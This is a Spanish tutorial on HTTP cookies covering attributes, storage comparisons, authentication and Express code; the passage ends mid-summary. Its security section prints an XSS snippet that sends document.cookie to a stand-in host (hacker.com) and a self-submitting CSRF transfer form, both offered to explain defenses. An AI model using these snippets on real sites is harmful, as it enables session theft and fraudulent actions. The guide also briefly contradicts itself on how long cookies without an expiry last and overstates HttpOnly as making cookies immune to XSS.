# 🍪 Guía Completa de Cookies HTTP
## Todo sobre Cookies: De 0 a 100

---

## 📚 Tabla de Contenidos

1. [¿Qué son las Cookies?](#1-qué-son-las-cookies)
2. [¿Cómo funcionan las Cookies?](#2-cómo-funcionan-las-cookies)
3. [Anatomía de una Cookie](#3-anatomía-de-una-cookie)
4. [Tipos de Cookies](#4-tipos-de-cookies)
5. [Cookies vs localStorage vs sessionStorage](#5-cookies-vs-localstorage-vs-sessionstorage)
6. [Seguridad de Cookies](#6-seguridad-de-cookies)
7. [Cookies en Autenticación](#7-cookies-en-autenticación)
8. [Trabajar con Cookies en JavaScript](#8-trabajar-con-cookies-en-javascript)
9. [Problemas Comunes](#9-problemas-comunes)
10. [Mejores Prácticas](#10-mejores-prácticas)

---

## 1. ¿Qué son las Cookies?

### 🍪 Definición Simple

**Cookie** = Pequeño archivo de texto que el servidor le pide al navegador que guarde

```
Analogía de la Pulsera del Parque:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Imagina que vas a un parque de diversiones:

1. Compras tu entrada en la taquilla (LOGIN)
2. Te ponen una pulsera con un código (COOKIE)
3. Cada vez que quieres subir a un juego, muestras la pulsera
4. El operador escanea la pulsera y verifica tu acceso
5. No necesitas volver a la taquilla (NO LOGIN DE NUEVO)

La COOKIE es como esa pulsera:
• El parque (servidor) te la dio
• La llevas contigo (navegador la guarda)
• La muestras automáticamente en cada juego (cada request)
• Prueba que ya pagaste (estás autenticado)
```

### 🌐 Historia Rápida

```
1994: Netscape inventa las cookies
      Problema: HTTP no recuerda nada
      Solución: Pequeños archivos que el navegador guarda

1995: Se vuelven populares para carritos de compra

2000s: También se usan para publicidad y tracking

Hoy: Esenciales para la web moderna
     (login, preferencias, carritos, etc.)
```

---

## 2. ¿Cómo funcionan las Cookies?

### 🔄 Flujo Completo

```
PRIMER REQUEST (sin cookie):
════════════════════════════════════════════════════════════

┌─────────────┐                          ┌─────────────┐
│  Navegador  │                          │  Servidor   │
│   (Chrome)  │                          │  (Backend)  │
└─────────────┘                          └─────────────┘
      │                                        │
      │─────── GET /login.html ───────────────▶│
      │                                        │
      │                                        │ Procesar request
      │                                        │
      │◀─────── Respuesta ────────────────────│
      │         HTML + Set-Cookie              │
      │                                        │
      │         Set-Cookie: sessionId=abc123;  │
      │                     Path=/;            │
      │                     HttpOnly;          │
      │                     Expires=...        │
      │                                        │
      ├─ Navegador GUARDA la cookie           │
      │  automáticamente                       │


SEGUNDO REQUEST (con cookie):
════════════════════════════════════════════════════════════

┌─────────────┐                          ┌─────────────┐
│  Navegador  │                          │  Servidor   │
└─────────────┘                          └─────────────┘
      │                                        │
      ├─ Navegador encuentra cookie para      │
      │  este dominio                          │
      │                                        │
      │─────── GET /profile ──────────────────▶│
      │        Cookie: sessionId=abc123        │
      │                                        │
      │        ⬆ ENVIADA AUTOMÁTICAMENTE       │
      │                                        │
      │                                        │ Verificar sessionId
      │                                        │ en base de datos
      │                                        │
      │◀─────── Respuesta ────────────────────│
      │         {user: "Juan", email: "..."}   │
      │                                        │
```

### 🎯 Puntos Clave

```
1. El SERVIDOR crea la cookie (con Set-Cookie header)
2. El NAVEGADOR guarda la cookie automáticamente
3. El NAVEGADOR envía la cookie en CADA request al mismo dominio
4. JavaScript NO tiene acceso si la cookie es HttpOnly
```

---

## 3. Anatomía de una Cookie

### 🔬 Estructura de una Cookie

```
┌─────────────────────────────────────────────────────────┐
│                    COOKIE COMPLETA                       │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Set-Cookie: sessionId=abc123xyz;                       │
│              Domain=example.com;                         │
│              Path=/;                                     │
│              Expires=Wed, 21 Oct 2025 07:28:00 GMT;     │
│              Secure;                                     │
│              HttpOnly;                                   │
│              SameSite=Lax                                │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │ NOMBRE=VALOR                                    │    │
│  │ ▲      ▲                                        │    │
│  │ │      └─ Valor (puede ser cualquier string)   │    │
│  │ └──────── Nombre de la cookie                   │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │ ATRIBUTOS (opcionales)                          │    │
│  │                                                  │    │
│  │ • Domain: Para qué dominio es válida            │    │
│  │ • Path: Para qué rutas es válida                │    │
│  │ • Expires: Cuándo expira                        │    │
│  │ • Max-Age: Segundos hasta que expire            │    │
│  │ • Secure: Solo HTTPS                            │    │
│  │ • HttpOnly: JavaScript no puede leerla          │    │
│  │ • SameSite: Protección CSRF                     │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 📋 Atributos Explicados

```
1. NOMBRE=VALOR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   sessionId=abc123
   tema=oscuro
   carrito=prod1,prod2,prod3

   • Único requerido
   • Puedes tener múltiples cookies


2. Domain (Dominio)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Domain=example.com

   Cookie se envía a:
   ✅ example.com
   ✅ www.example.com
   ✅ api.example.com
   ❌ otrodominio.com

   Si NO se especifica: solo dominio exacto


3. Path (Ruta)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Path=/admin

   Cookie se envía a:
   ✅ example.com/admin
   ✅ example.com/admin/users
   ❌ example.com/
   ❌ example.com/public

   Path=/ → Cookie se envía a TODAS las rutas


4. Expires / Max-Age (Expiración)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Expires=Wed, 21 Oct 2025 07:28:00 GMT
   o
   Max-Age=3600  (segundos: 1 hora)

   Sin expiración: Cookie de SESIÓN (se borra al cerrar navegador)
   Con expiración: Cookie PERSISTENTE (sobrevive al cerrar)


5. Secure (Solo HTTPS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Secure

   ✅ Cookie se envía por HTTPS
   ❌ Cookie NO se envía por HTTP

   ⚠️ OBLIGATORIO para autenticación en producción


6. HttpOnly (No JavaScript)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   HttpOnly

   ✅ Solo HTTP puede acceder
   ❌ document.cookie NO puede leerla
   ✅ Protege contra XSS

   ⚠️ OBLIGATORIO para sesiones de autenticación


7. SameSite (Protección CSRF)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   SameSite=Strict   → Solo requests del MISMO sitio
   SameSite=Lax      → Navegación normal OK, formularios cross-site NO
   SameSite=None     → Cualquier sitio (requiere Secure)

   Ejemplo:
   ┌────────────────────────────────────────────────────┐
   │ Estás en: example.com                             │
   │ Link a: othersite.com                             │
   │                                                    │
   │ SameSite=Strict → Cookie NO se envía              │
   │ SameSite=Lax    → Cookie SÍ se envía (navegación) │
   │ SameSite=None   → Cookie SÍ se envía (cualquier)  │
   └────────────────────────────────────────────────────┘
```

---

## 4. Tipos de Cookies

### 📦 Clasificación por Duración

```
1. COOKIES DE SESIÓN (Session Cookies)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Set-Cookie: sessionId=abc123

• SIN atributo Expires o Max-Age
• Se borran al CERRAR el navegador
• Uso: sesiones temporales

Ejemplo: Carrito de compras temporal


2. COOKIES PERSISTENTES (Persistent Cookies)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Set-Cookie: remember=true; Max-Age=2592000

• CON atributo Expires o Max-Age
• Sobreviven al cerrar navegador
• Se borran al expirar

Ejemplo: "Recordarme" en login
```

### 🎯 Clasificación por Propósito

```
1. COOKIES NECESARIAS (Strictly Necessary)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   • Sesión de usuario
   • Carrito de compras
   • Preferencias de seguridad

   ⚠️ No requieren consentimiento (esenciales)


2. COOKIES DE PREFERENCIAS (Preference/Functional)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   • Idioma seleccionado
   • Tema (claro/oscuro)
   • Layout preferido

   ⚠️ Suelen requerir consentimiento


3. COOKIES DE ANÁLISIS (Analytics)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   • Google Analytics
   • Métricas de uso
   • Estadísticas del sitio

   ⚠️ Requieren consentimiento


4. COOKIES DE PUBLICIDAD (Advertising/Tracking)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   • Anuncios personalizados
   • Retargeting
   • Seguimiento entre sitios

   ⚠️ Requieren consentimiento explícito
```

### 🌍 Clasificación por Origen

```
1. FIRST-PARTY COOKIES (Primera Parte)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Estás en: www.tienda.com
Cookie de: www.tienda.com

✅ Del MISMO dominio que visitas
✅ Generalmente aceptables
✅ Usadas para funcionalidad del sitio


2. THIRD-PARTY COOKIES (Tercera Parte)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Estás en: www.tienda.com
Cookie de: analytics.google.com

❌ De OTRO dominio
⚠️ Usadas para tracking
⚠️ Muchos navegadores las bloquean

Ejemplo visual:
┌────────────────────────────────────────────────────┐
│  www.tienda.com (lo que ves)                      │
│  ┌──────────────────────────────────────────────┐ │
│  │ Contenido del sitio                          │ │
│  │                                               │ │
│  │ <iframe src="ads.google.com/banner">         │ │
│  │   ▲                                           │ │
│  │   └─ Este iframe crea THIRD-PARTY cookies    │ │
│  └──────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────┘
```

---

## 5. Cookies vs localStorage vs sessionStorage

### 📊 Tabla Comparativa

```
┌──────────────┬────────────┬──────────────┬───────────────┐
│ Característica│  Cookie   │ localStorage │ sessionStorage│
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Capacidad    │ 4KB        │ 5-10MB       │ 5-10MB        │
│              │            │              │               │
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Expiración   │ Config.    │ Nunca        │ Al cerrar tab │
│              │ o sesión   │              │               │
│              │            │              │               │
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Enviado al   │ ✅ Sí      │ ❌ No        │ ❌ No         │
│ servidor     │ (auto)     │              │               │
│              │            │              │               │
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Accesible    │ Solo si NO │ ✅ Sí        │ ✅ Sí         │
│ desde JS     │ HttpOnly   │              │               │
│              │            │              │               │
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Alcance      │ Dominio    │ Origen       │ Origen + Tab  │
│              │ + Path     │ completo     │ específica    │
│              │            │              │               │
├──────────────┼────────────┼──────────────┼───────────────┤
│              │            │              │               │
│ Seguridad    │ Secure,    │ Ninguna      │ Ninguna       │
│              │ HttpOnly,  │              │               │
│              │ SameSite   │              │               │
│              │            │              │               │
└──────────────┴────────────┴──────────────┴───────────────┘
```

### 🎯 Cuándo usar cada uno

```
USA COOKIES cuando:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Necesitas que se envíen AUTOMÁTICAMENTE al servidor
✅ Autenticación (con HttpOnly + Secure)
✅ Información que el servidor necesita en cada request
✅ Necesitas expiración automática
✅ Quieres máxima seguridad (HttpOnly protege de XSS)

Ejemplo: sessionId, csrf-token


USA localStorage cuando:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Necesitas guardar MUCHA información
✅ Datos que NO necesitas enviar al servidor
✅ Persistencia permanente (no expira)
✅ Preferencias de UI
✅ Cache de datos

Ejemplo: Tema (claro/oscuro), idioma, datos de la app


USA sessionStorage cuando:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Datos temporales de la sesión
✅ Formularios de múltiples pasos
✅ Estado temporal de UI
✅ Datos que NO deben persistir

Ejemplo: Wizard de checkout, filtros temporales
```

### 📋 Ejemplo Comparativo

```javascript
// ═══════════════════════════════════════════════════════════
// COOKIES (desde el servidor)
// ═══════════════════════════════════════════════════════════

// Backend (Node.js/Express)
res.cookie('sessionId', 'abc123', {
    httpOnly: true,    // JavaScript NO puede leerla
    secure: true,      // Solo HTTPS
    maxAge: 86400000,  // 24 horas
    sameSite: 'lax'
});

// Frontend: NO puedes leer esta cookie desde JavaScript
// Se envía AUTOMÁTICAMENTE en cada request


// ═══════════════════════════════════════════════════════════
// localStorage (solo frontend)
// ═══════════════════════════════════════════════════════════

// Guardar
localStorage.setItem('tema', 'oscuro');
localStorage.setItem('idioma', 'es');

// Leer
const tema = localStorage.getItem('tema'); // "oscuro"

// Eliminar
localStorage.removeItem('tema');

// Limpiar todo
localStorage.clear();

// ⚠️ NO se envía al servidor automáticamente
// Persiste PARA SIEMPRE (hasta que lo borres)


// ═══════════════════════════════════════════════════════════
// sessionStorage (solo frontend)
// ═══════════════════════════════════════════════════════════

// Guardar
sessionStorage.setItem('paso', '2');
sessionStorage.setItem('datosFormulario', JSON.stringify(datos));

// Leer
const paso = sessionStorage.getItem('paso'); // "2"

// ⚠️ Se BORRA al cerrar la pestaña
// Cada pestaña tiene su propio sessionStorage
```

---

## 6. Seguridad de Cookies

### 🔒 Ataques Comunes

```
1. XSS (Cross-Site Scripting)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ATAQUE:
Hacker inyecta JavaScript malicioso en tu sitio:

<script>
  // Robar cookie de sesión
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: document.cookie  // ¡Se roba la cookie!
  });
</script>

DEFENSA:
Set-Cookie: sessionId=abc123; HttpOnly

Con HttpOnly:
- document.cookie NO puede leerla
- Solo el servidor puede acceder
- JavaScript malicioso NO puede robarla


2. CSRF (Cross-Site Request Forgery)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ATAQUE:
Usuario está logueado en banco.com
Hacker lo engaña para que visite sitio-malicioso.com

sitio-malicioso.com tiene:
<form action="https://banco.com/transferir" method="POST">
  <input name="destino" value="cuentaHacker">
  <input name="monto" value="10000">
</form>
<script>document.forms[0].submit();</script>

El navegador ENVÍA LA COOKIE automáticamente → ¡Transferencia!

DEFENSA:
Set-Cookie: sessionId=abc123; SameSite=Lax

Con SameSite:
- Cookie NO se envía desde otros sitios
- Solo requests del mismo origen


3. Man-in-the-Middle (MITM)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ATAQUE:
Usuario en WiFi público
Hacker intercepta tráfico HTTP
Ve la cookie en texto plano → la roba

DEFENSA:
Set-Cookie: sessionId=abc123; Secure

Con Secure:
- Cookie SOLO se envía por HTTPS
- HTTPS encripta el tráfico
- Hacker no puede ver la cookie
```

### ✅ Cookie Segura Completa

```
COOKIE DE SESIÓN SEGURA:
════════════════════════════════════════════════════════════

Set-Cookie: sessionId=abc123xyz789;
            Domain=example.com;
            Path=/;
            Max-Age=86400;
            Secure;
            HttpOnly;
            SameSite=Lax

┌────────────────────────────────────────────────────┐
│ ✅ Secure      → Solo HTTPS                        │
│ ✅ HttpOnly    → JavaScript no puede leerla        │
│ ✅ SameSite    → Protección CSRF                   │
│ ✅ Max-Age     → Expira en 24 horas                │
│ ✅ Path=/      → Válida para todo el sitio         │
└────────────────────────────────────────────────────┘

Esta cookie es:
• Encriptada en tránsito (Secure)
• Inmune a XSS (HttpOnly)
• Protegida contra CSRF (SameSite)
• Con expiración (Max-Age)
```

---

## 7. Cookies en Autenticación

### 🔐 Flujo de Autenticación con Cookies

```
PASO 1: LOGIN
════════════════════════════════════════════════════════════

Cliente                                    Servidor
  │                                            │
  │─── POST /login ────────────────────────────▶
  │    {email, password}                       │
  │                                            │
  │                                            ├─ Verificar credenciales
  │                                            ├─ Crear sesión en DB
  │                                            ├─ sessionId: "abc123"
  │                                            │
  │◀── Respuesta ──────────────────────────────│
  │    Status: 200                             │
  │    Set-Cookie: sessionId=abc123;           │
  │                HttpOnly; Secure;           │
  │                SameSite=Lax                │
  │                                            │
  ├─ Navegador guarda cookie AUTOMÁTICAMENTE  │


PASO 2: REQUEST AUTENTICADO
════════════════════════════════════════════════════════════

Cliente                                    Servidor
  │                                            │
  ├─ Navegador agrega cookie                  │
  │  AUTOMÁTICAMENTE                           │
  │                                            │
  │─── GET /api/profile ───────────────────────▶
  │    Cookie: sessionId=abc123                │
  │                                            │
  │                                            ├─ Extraer sessionId
  │                                            ├─ Buscar en DB
  │                                            ├─ Encontrar userId: 42
  │                                            │
  │◀── Respuesta ──────────────────────────────│
  │    {id: 42, email: "juan@..."}             │


PASO 3: LOGOUT
════════════════════════════════════════════════════════════

Cliente                                    Servidor
  │                                            │
  │─── POST /logout ───────────────────────────▶
  │    Cookie: sessionId=abc123                │
  │                                            │
  │                                            ├─ Eliminar sesión de DB
  │                                            │
  │◀── Respuesta ──────────────────────────────│
  │    Set-Cookie: sessionId=;                 │
  │                Expires=Thu, 01 Jan 1970... │
  │                                            │
  ├─ Cookie eliminada                          │
```

### ⚖️ Cookies vs Tokens (JWT) para Auth

```
┌─────────────────────────────────────────────────────────┐
│              COOKIES vs JWT PARA AUTH                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  COOKIES:                                               │
│  ━━━━━━━━                                               │
│  Set-Cookie: sessionId=abc123; HttpOnly; Secure         │
│                                                          │
│  ✅ HttpOnly → Inmune a XSS                             │
│  ✅ SameSite → Protección CSRF                          │
│  ✅ Automático → No necesitas código extra              │
│  ✅ Revocable → Servidor invalida en cualquier momento  │
│  ❌ CORS complicado → Problemas cross-domain            │
│  ❌ Móviles → No funciona bien en apps nativas          │
│                                                          │
│  JWT (en localStorage/header):                          │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                          │
│  Authorization: Bearer eyJhbGc...                       │
│                                                          │
│  ✅ CORS fácil → Funciona cross-domain                  │
│  ✅ Móviles → Funciona en apps nativas                  │
│  ✅ Stateless → Servidor no guarda nada                 │
│  ❌ XSS → localStorage vulnerable                       │
│  ❌ No revocable → Válido hasta que expire              │
│  ❌ Manual → Debes agregarlo a cada request             │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 8. Trabajar con Cookies en JavaScript

### 🛠️ Leer Cookies (Frontend)

```javascript
// ═══════════════════════════════════════════════════════════
// LEER COOKIES (solo las que NO son HttpOnly)
// ═══════════════════════════════════════════════════════════

// document.cookie devuelve TODAS las cookies como string:
console.log(document.cookie);
// "tema=oscuro; idioma=es; edad=25"

// Función helper para parsear:
function getCookie(nombre) {
    const cookies = document.cookie.split('; ');
    
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === nombre) {
            return decodeURIComponent(value);
        }
    }
    
    return null;
}

// Uso:
const tema = getCookie('tema'); // "oscuro"
const idioma = getCookie('idioma'); // "es"

// ⚠️ IMPORTANTE: 
// Si la cookie tiene HttpOnly, NO aparecerá en document.cookie
```

### ✍️ Escribir Cookies (Frontend)

```javascript
// ═══════════════════════════════════════════════════════════
// ESCRIBIR COOKIES (sin HttpOnly)
// ═══════════════════════════════════════════════════════════

// Básico:
document.cookie = "tema=oscuro";

// Con atributos:
document.cookie = "tema=oscuro; max-age=3600; path=/";

// Función helper completa:
function setCookie(nombre, valor, opciones = {}) {
    let cookie = `${encodeURIComponent(nombre)}=${encodeURIComponent(valor)}`;
    
    // Max-Age (segundos)
    if (opciones.maxAge) {
        cookie += `; max-age=${opciones.maxAge}`;
    }
    
    // Expires (fecha)
    if (opciones.expires) {
        cookie += `; expires=${opciones.expires.toUTCString()}`;
    }
    
    // Path
    if (opciones.path) {
        cookie += `; path=${opciones.path}`;
    }
    
    // Domain
    if (opciones.domain) {
        cookie += `; domain=${opciones.domain}`;
    }
    
    // Secure
    if (opciones.secure) {
        cookie += '; secure';
    }
    
    // SameSite
    if (opciones.sameSite) {
        cookie += `; samesite=${opciones.sameSite}`;
    }
    
    document.cookie = cookie;
}

// Uso:
setCookie('tema', 'oscuro', {
    maxAge: 86400,     // 24 horas
    path: '/',
    secure: true,
    sameSite: 'lax'
});

setCookie('idioma', 'es', {
    expires: new Date('2025-12-31'),
    path: '/'
});
```

### 🗑️ Eliminar Cookies (Frontend)

```javascript
// ═══════════════════════════════════════════════════════════
// ELIMINAR COOKIES
// ═══════════════════════════════════════════════════════════

// Para eliminar: poner fecha pasada
function deleteCookie(nombre, path = '/') {
    document.cookie = `${nombre}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=${path}`;
}

// Uso:
deleteCookie('tema');
deleteCookie('idioma');

// ⚠️ IMPORTANTE: 
// Debes usar el MISMO path que cuando la creaste
```

### 🖥️ Crear Cookies (Backend - Node.js/Express)

```javascript
// ═══════════════════════════════════════════════════════════
// BACKEND: Node.js con Express
// ═══════════════════════════════════════════════════════════

const express = require('express');
const app = express();

// Middleware para parsear cookies
const cookieParser = require('cookie-parser');
app.use(cookieParser());

// ─────────────────────────────────────────────────────────
// LOGIN: Crear cookie de sesión
// ─────────────────────────────────────────────────────────

app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    
    // Verificar credenciales...
    const user = await verificarUsuario(email, password);
    
    if (user) {
        // Crear sesión
        const sessionId = generarSessionId();
        await guardarSesionEnDB(sessionId, user.id);
        
        // ✅ Crear cookie SEGURA
        res.cookie('sessionId', sessionId, {
            httpOnly: true,    // JavaScript NO puede leerla (XSS)
            secure: true,      // Solo HTTPS (MITM)
            sameSite: 'lax',   // Protección CSRF
            maxAge: 86400000   // 24 horas
        });
        
        res.json({ success: true, userId: user.id });
    } else {
        res.status(401).json({ error: 'Credenciales inválidas' });
    }
});

// ─────────────────────────────────────────────────────────
// MIDDLEWARE: Verificar autenticación
// ─────────────────────────────────────────────────────────

async function requireAuth(req, res, next) {
    // Leer cookie (automáticamente parseada por cookie-parser)
    const sessionId = req.cookies.sessionId;
    
    if (!sessionId) {
        return res.status(401).json({ error: 'No autenticado' });
    }
    
    // Verificar sesión en DB
    const session = await buscarSesionEnDB(sessionId);
    
    if (!session) {
        return res.status(401).json({ error: 'Sesión inválida' });
    }
    
    // Agregar userId al request
    req.userId = session.userId;
    next();
}

// ─────────────────────────────────────────────────────────
// RUTA PROTEGIDA: Usar middleware
// ─────────────────────────────────────────────────────────

app.get('/api/profile', requireAuth, async (req, res) => {
    // req.userId está disponible gracias al middleware
    const user = await obtenerUsuario(req.userId);
    res.json(user);
});

// ─────────────────────────────────────────────────────────
// LOGOUT: Eliminar cookie
// ─────────────────────────────────────────────────────────

app.post('/logout', async (req, res) => {
    const sessionId = req.cookies.sessionId;
    
    // Eliminar sesión de DB
    await eliminarSesionDeDB(sessionId);
    
    // Eliminar cookie
    res.clearCookie('sessionId', {
        httpOnly: true,
        secure: true,
        sameSite: 'lax'
    });
    
    res.json({ success: true });
});
```

---

## 9. Problemas Comunes

### ⚠️ Problema 1: Cookie no se envía

```
SÍNTOMA:
Backend no recibe la cookie

CAUSAS COMUNES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Domain incorrecto
   Cookie: Domain=example.com
   Request a: api.othersite.com
   → Cookie NO se envía

2. Path incorrecto
   Cookie: Path=/admin
   Request a: /api/users
   → Cookie NO se envía

3. Secure sin HTTPS
   Cookie: Secure
   Request por: HTTP
   → Cookie NO se envía

4. SameSite=Strict cross-site
   Cookie en: site1.com
   Request desde: site2.com
   → Cookie NO se envía

5. Cookie expirada
   Cookie: Max-Age=3600 (hace 2 horas)
   → Cookie eliminada automáticamente


SOLUCIONES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Verificar Domain coincide o es parent del request
✅ Usar Path=/ para todo el sitio
✅ Quitar Secure en desarrollo (localhost HTTP)
✅ Usar SameSite=Lax en lugar de Strict
✅ Verificar fecha de expiración
```

### ⚠️ Problema 2: CORS con Cookies

```
SÍNTOMA:
Frontend en http://localhost:3000
Backend en http://localhost:5000
Cookie no se envía

SOLUCIÓN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Backend (Express):
const cors = require('cors');

app.use(cors({
    origin: 'http://localhost:3000',  // Frontend URL
    credentials: true                 // ✅ IMPORTANTE
}));

// Frontend (fetch):
fetch('http://localhost:5000/api/profile', {
    credentials: 'include'  // ✅ IMPORTANTE
});

// O con axios:
axios.get('http://localhost:5000/api/profile', {
    withCredentials: true  // ✅ IMPORTANTE
});
```

### ⚠️ Problema 3: Cookie no aparece en DevTools

```
SÍNTOMA:
Cookie creada pero no visible en Chrome DevTools

CAUSAS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Cookie tiene HttpOnly
   → NO aparece en Application > Storage > Cookies
   → SÍ aparece en Network > Headers > Response Headers

2. Cookie tiene Domain diferente
   → Verificar que estés viendo el dominio correcto

3. Cookie expiró
   → Se eliminó automáticamente


CÓMO VER COOKIES HttpOnly:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Chrome DevTools:
1. Abrir Network tab
2. Hacer el request (login)
3. Click en el request
4. Ver Headers > Response Headers > Set-Cookie
```

---

## 10. Mejores Prácticas

### ✅ Checklist de Seguridad

```
PARA COOKIES DE AUTENTICACIÓN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ HttpOnly        (protege contra XSS)
✅ Secure          (solo HTTPS en producción)
✅ SameSite=Lax    (protege contra CSRF)
✅ Max-Age/Expires (evita cookies eternas)
✅ Path=/          (válida para todo el sitio)

Ejemplo:
Set-Cookie: sessionId=abc123;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=86400;
            Path=/


PARA COOKIES DE PREFERENCIAS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ SameSite=Lax    (protección básica)
✅ Max-Age largo   (persistencia)
✅ Path=/          (todo el sitio)
❌ NO HttpOnly     (necesitas leerlas desde JS)
⚠️  Secure solo en producción

Ejemplo:
Set-Cookie: tema=oscuro;
            SameSite=Lax;
            Max-Age=31536000;
            Path=/
```

### 📋 Guía Rápida de Decisiones

```
┌─────────────────────────────────────────────────────────┐
│          ¿QUÉ USAR PARA QUÉ?                            │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  🔐 AUTENTICACIÓN:                                      │
│     → Cookies (HttpOnly + Secure + SameSite)           │
│                                                          │
│  🎨 TEMA / PREFERENCIAS UI:                             │
│     → localStorage (persiste, no se envía al servidor)  │
│                                                          │
│  🛒 CARRITO DE COMPRAS:                                 │
│     → Cookie de sesión (se envía al backend)            │
│       o localStorage si carrito solo frontend           │
│                                                          │
│  📝 FORMULARIO MULTI-PASO:                              │
│     → sessionStorage (solo durante sesión)              │
│                                                          │
│  🌍 IDIOMA:                                             │
│     → Cookie (backend necesita saber para SSR)          │
│       o localStorage (si solo frontend)                 │
│                                                          │
│  📊 ANALYTICS:                                          │
│     → Third-party cookies (con consentimiento)          │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 🚫 Errores Comunes a Evitar

```
❌ NO HACER:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Guardar info sensible en cookies sin HttpOnly
   ❌ document.cookie = "password=" + password;
   
2. Cookies sin expiración para sesiones
   ❌ Set-Cookie: sessionId=abc123
       (se queda para siempre)
   
3. No usar Secure en producción
   ❌ Solo HttpOnly (sin Secure)
       → Cookie viaja sin encriptar
   
4. Confiar en cookies del cliente
   ❌ Cookie: isAdmin=true
       → Cliente puede modificarlo
   
5. No manejar CORS correctamente
   ❌ credentials: 'omit' en fetch
       → Cookie no se envía

✅ HACER:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Siempre HttpOnly + Secure + SameSite para auth
2. Establecer Max-Age o Expires
3. Verificar en backend, NUNCA confiar en el cliente
4. Usar credentials: 'include' con CORS
5. Regenerar sessionId después de login
```

---

## 📝 Resumen Final

### 🎯 Puntos Clave

```
1. COOKIES = Pequeños archivos que el servidor pide al navegador guardar

2. SE ENVÍAN AUTOMÁTICAMENTE en cada request al mismo dominio

3. ATRIBUTOS CLAVE:
   • HttpOnly  → Protege contra XSS
   • Secure    → Solo HTTPS
   • SameSite  → Protege contra CSRF
   • Max-Age   → Cuándo expira

4. DIFERENCIAS:
   • Cookie → Se envía al servidor automáticamente
   • localStorage → Solo frontend, no se envía
   • sessionStorage → Solo frontend, expira al cerrar tab

5. PARA AUTENTICACIÓN:
   • Usa cookies con HttpOnly + Secure + SameSite
   • Backend crea la cookie (Set-Cookie header)
   • Frontend NO puede leerla (pero se envía automática)

6. SEGURIDAD:
